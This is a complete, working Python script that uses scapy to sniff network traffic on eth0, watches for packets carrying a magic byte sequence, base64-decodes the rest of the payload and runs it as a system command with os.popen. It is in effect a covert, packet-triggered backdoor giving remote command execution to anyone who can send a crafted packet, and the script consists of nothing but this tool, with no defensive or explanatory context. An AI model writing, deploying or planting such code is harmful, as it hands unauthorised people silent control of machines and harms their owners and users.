from scapy.all import sniff, Raw
import base64
import os

INTERFACE = "eth0"

MAGIC_WORD = b"\x90\x90\xfa\xce"

def execute_command(cmd):
    print(f"[+] Executing command: {cmd}")
    output = os.popen(cmd).read()
    print(f"[+] Output:\n{output}")

def packet_callback(packet):
    if packet.haslayer(Raw):
        payload = packet[Raw].load
        if MAGIC_WORD in payload:
            try:
                encoded = payload.split(MAGIC_WORD, 1)[1].strip()
                decoded = base64.b64decode(encoded).decode('utf-8')
                execute_command(decoded)
            except Exception as e:
                print(f"[!] Error parsing: {e}")

def main():
    print(f"[*] Sniffing on interface {INTERFACE}...")
    sniff(iface=INTERFACE, prn=packet_callback, store=False)

if __name__ == "__main__":
    main()
